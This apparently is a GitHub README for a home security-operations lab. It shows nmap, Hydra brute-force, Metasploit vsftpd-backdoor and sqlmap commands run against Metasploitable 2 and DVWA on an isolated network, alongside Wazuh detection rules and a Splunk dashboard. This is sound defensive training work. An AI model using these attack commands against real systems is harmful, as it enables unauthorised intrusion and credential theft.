# Home SOC Lab — Attack Detection & Threat Monitoring

A fully functional Security Operations Center built at home using open-source tools. This lab simulates real-world cyberattacks and demonstrates detection, alerting, and log analysis using industry-standard SIEM platforms.

---

## Project Summary

| Detail | Info |
|--------|------|
| Lab Type | Home SOC Lab |
| Host Machine | Windows 11, 24GB RAM — VirtualBox |
| SIEM Tools | Wazuh 4.7 + Splunk Enterprise |
| Attacker Machine | Kali Linux 2019.3 |
| Target Machine | Metasploitable 2 |
| Attacks Simulated | 5 real-world attack techniques |
| Status | Complete |

---

## Network Topology

```
┌─────────────────────────────────────────────────────┐
│           VirtualBox Host-Only Network               │
│               192.168.56.0/24                        │
│                                                      │
│  ┌──────────────┐        ┌──────────────────────┐   │
│  │  Kali Linux  │──────▶│   Metasploitable 2   │   │
│  │192.168.56.101│        │   192.168.56.104      │   │
│  │  (Attacker)  │        │     (Target)          │   │
│  └──────────────┘        └──────────────────────┘   │
│         │                          │                 │
│         ▼                          ▼                 │
│  ┌──────────────┐        ┌──────────────────────┐   │
│  │ Wazuh SIEM   │◀──────│    Splunk SIEM        │   │
│  │192.168.56.10 │        │   192.168.56.11       │   │
│  │  (Monitor)   │──────▶│   (Log Analysis)      │   │
│  └──────────────┘        └──────────────────────┘   │
│                                                      │
│  ┌──────────────────────────────────────────────┐   │
│  │   Windows 11 Host — Wazuh Agent (Knock-Knock)│   │
│  │                192.168.56.1                   │   │
│  └──────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────┘
```

---

## Virtual Machines

| VM | IP Address | Role |
|----|-----------|------|
| Kali Linux 2019.3 | 192.168.56.101 | Attacker |
| Metasploitable 2 | 192.168.56.104 | Vulnerable Target |
| Wazuh Manager (Ubuntu 22.04) | 192.168.56.10 | SIEM / Alert Engine |
| Splunk Enterprise (Ubuntu 22.04) | 192.168.56.11 | Log Analysis Platform |
| Windows 11 Host | 192.168.56.1 | Wazuh Agent (ID: 002) |

---

## Attack Simulations

### Attack 1 — Nmap Port Scan
**Technique:** MITRE ATT&CK T1046 — Network Service Discovery

```bash
nmap -sS 192.168.56.104
```

Generated 660+ Wazuh alerts. Identified open ports including FTP (21), SSH (22), HTTP (80), and multiple vulnerable services running on Metasploitable.

---

### Attack 2 — Hydra SSH Brute Force
**Technique:** MITRE ATT&CK T1110 — Brute Force

```bash
hydra -l msfadmin -P /tmp/shortlist.txt ssh://192.168.56.104 -t 4 -V
```

Successfully cracked SSH credentials. Authentication failure alerts triggered in Wazuh with source IP tracking from Kali (192.168.56.101).

---

### Attack 3 — Metasploit vsftpd Backdoor
**Technique:** MITRE ATT&CK T1190 — Exploit Public-Facing Application

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.104
run
```

Obtained full root shell on target — `uid=0(root) gid=0(root)`. Demonstrated complete system compromise via known CVE in vsftpd 2.3.4.

---

### Attack 4 — SQLMap SQL Injection
**Technique:** MITRE ATT&CK T1190 — SQL Injection via DVWA

```bash
sqlmap -u 'http://192.168.56.104/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit' \
--cookie='security=low;PHPSESSID=<session>' --dbs --batch
```

Exposed 7 databases: dvwa, information_schema, metasploit, mysql, owasp10, tikiwiki, tikiwiki195.

---

### Attack 5 — FTP Brute Force
**Technique:** MITRE ATT&CK T1110.001 — Password Guessing

```bash
hydra -l admin -P /tmp/shortlist.txt ftp://192.168.56.104 -V
```

FTP brute force attempts logged and flagged by Wazuh authentication failure rules.

---

## SIEM Detection — Wazuh

### Custom Detection Rules

```xml
<group name="local,syslog,sshd,">

  <rule id="100001" level="10">
    <if_sid>5716</if_sid>
    <description>SSH Brute Force Attack Detected</description>
  </rule>

  <rule id="100002" level="8">
    <if_sid>533</if_sid>
    <description>Port Scan Detected</description>
  </rule>

  <rule id="100003" level="10">
    <if_sid>11100</if_sid>
    <description>FTP Brute Force Detected</description>
  </rule>

  <rule id="100004" level="12">
    <if_sid>5501</if_sid>
    <description>Root Login Detected</description>
  </rule>

</group>
```

### Alert Summary

| Attack | Alerts Generated |
|--------|-----------------|
| Nmap Port Scan | 660+ |
| SSH Brute Force | Multiple authentication failure alerts |
| Metasploit Shell | Root login alert (Rule 100004) |
| SQL Injection | Web attack events logged |
| FTP Brute Force | Authentication failure alerts |

---

## Splunk Dashboard

Wazuh events forwarded to Splunk via syslog. 580+ events indexed under `index=wazuh`.

| Panel | Description |
|-------|-------------|
| Top 10 Security Alerts | Most frequent alert types |
| Alert Levels Over Time | Severity trend over 24 hours |
| Top Source IPs | Most active attacker IPs |
| Top Rule IDs | Most triggered detection rules |
| High Severity Alerts | Count of level 10+ alerts |

---

## Tools and Technologies

| Category | Tools |
|----------|-------|
| SIEM | Wazuh 4.7, Splunk Enterprise |
| Penetration Testing | Metasploit, Nmap, Hydra, SQLMap |
| Vulnerable Targets | Metasploitable 2, DVWA |
| Virtualization | VirtualBox on Windows 11 |
| Operating Systems | Ubuntu 22.04 LTS, Kali Linux, Windows 11 |
| Protocols Targeted | SSH, FTP, HTTP, TCP |

---

## Repository Structure

```
home-soc-lab/
├── README.md
├── screenshots/
│   ├── 01-wazuh-dashboard.png
│   ├── 02-splunk-home.png
│   ├── 03-wazuh-splunk-connected.png
│   ├── 04-windows-agent-active.png
│   ├── 05-kali-vm.png
│   ├── 06-metasploitable-vm.png
│   ├── 07-splunk-dashboard.png
│   └── 08-custom-rules.png
├── attacks/
│   ├── 01-nmap-kali.png
│   ├── 02-nmap-wazuh.png
│   ├── 03-hydra-kali.png
│   ├── 04-hydra-wazuh.png
│   ├── 05-metasploit-shell.png
│   ├── 06-metasploit-wazuh.png
│   ├── 07-sqlmap-kali.png
│   └── 08-ftp-brute.png
└── configs/
    └── local_rules.xml
```

---

## Skills Demonstrated

- SIEM deployment and configuration — Wazuh and Splunk
- Log forwarding pipeline from Wazuh to Splunk
- Custom detection rule development for real attack patterns
- Penetration testing using industry-standard tools
- Alert triage and event correlation
- Network segmentation and lab design
- MITRE ATT&CK framework mapping
- SOC monitoring dashboard creation in Splunk

---

## References

- [Wazuh Documentation](https://documentation.wazuh.com)
- [Splunk Training](https://www.splunk.com/en_us/training.html)
- [MITRE ATT&CK Framework](https://attack.mitre.org)

---

## Connect

[LinkedIn](https://linkedin.com/in/rajul-gupta-5b87a0188/) | [GitHub](https://github.com/rajul97)
